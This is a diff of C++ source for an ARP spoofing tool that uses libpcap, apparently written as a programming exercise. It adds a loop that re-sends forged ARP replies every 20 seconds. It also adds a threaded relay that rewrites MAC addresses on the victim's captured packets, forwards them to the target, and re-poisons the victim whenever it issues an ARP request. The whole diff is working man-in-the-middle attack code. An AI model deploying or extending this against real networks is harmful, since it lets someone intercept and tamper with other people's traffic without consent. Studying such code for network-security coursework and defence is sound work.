@@ -154,45 +154,80 @@ bool SendArpInfectPkt(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip
 }
 
 
-bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
-
+void PeriodicInfection(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip){
     while (true)
     {
-        pcap_pkthdr* header;
-        const u_char* recv_packet; // Too many Stack Memory?
-        
-        int res = pcap_next_ex(handle, &header, &recv_packet);
-        if (res == 0) continue;
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
-        }
+        std::this_thread::sleep_for(std::chrono::seconds(20));
+        SendArpInfectPkt(handle, sender_ip, sender_mac, target_ip, ARP_REP_TYPE);
+    } 
+}
 
-        // if receive packet is 
-        // 0. ip packet
-        // 1. from sender
-        // 2. to gateway
-        EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
-        if (_recv_packet->eth_.type() == EthHdr::Ip4 && _recv_packet->eth_.dmac() != Mac("FF:FF:FF:FF:FF:FF")){
-            if (_recv_packet->ip_.sip == htonl(sender_ip) && _recv_packet->ip_.dip !=  htonl(myIp) ){
-                
-                _recv_packet->eth_.smac_ = myMac;
-                _recv_packet->eth_.dmac_ = target_mac;
+bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
+    
+    static std::queue<std::pair<Ip, Ip>> Arp_queue;
 
-                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-                
-            }
-        }
-
-        if (_recv_packet->eth_.type() == EthHdr::Arp){
-            if (_recv_packet->ip_.sip == sender_ip && _recv_packet->ip_.dip ==  target_ip ){
+    std::thread t1([](pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
+        while (true)
+        {
+            pcap_pkthdr* header;
+            const u_char* recv_packet; // Too many Stack Memory?
+            
+            int res = pcap_next_ex(handle, &header, &recv_packet);
+            if (res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                 break;
             }
-        }   
-    }
+
+            // if receive packet is 
+            // 0. ip packet
+            // 1. from sender
+            // 2. to gateway
+            EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
+            if (_recv_packet->eth_.type() == EthHdr::Ip4 && _recv_packet->eth_.dmac() != Mac("FF:FF:FF:FF:FF:FF")){
+                if (_recv_packet->ip_.sip == htonl(sender_ip) && _recv_packet->ip_.dip !=  htonl(myIp) ){
+                    
+                    _recv_packet->eth_.smac_ = myMac;
+                    _recv_packet->eth_.dmac_ = target_mac;
+
+                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
+                    if (res != 0) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                    }
+                    continue;
+                    
+                }
+            }
+
+            // if receive packet is
+            // 0. arp packet
+            // 1. request from sender
+            // 2. to target_ip
+            EthArpPacket* __recv_packet = (EthArpPacket*) recv_packet;
+            if (__recv_packet->eth_.type() == EthHdr::Arp){
+                if(__recv_packet->arp_.sip() == sender_ip && __recv_packet->arp_.tip() == target_ip){
+                    std::pair<Ip, Ip> p_arp(sender_ip, target_ip);
+                    Arp_queue.push( p_arp );
+                    Arp_queue.pop();
+                    SendArpInfectPkt(handle, sender_ip, sender_mac, target_ip, ARP_REP_TYPE);
+                }
+            }   
+        }
+
+    }, handle, sender_ip, sender_mac, target_ip, target_mac);
+    /*
+    std::thread t2([](){
+        while (true)
+        {
+            if(Arp_queue.empty() == false){ // mutex? semaphore?
+                SendArpInfectPkt( )
+            } 
+        }
+    })
+    */
+    
+    t1.join();
+    //t2.join();
 
     return true;
 }
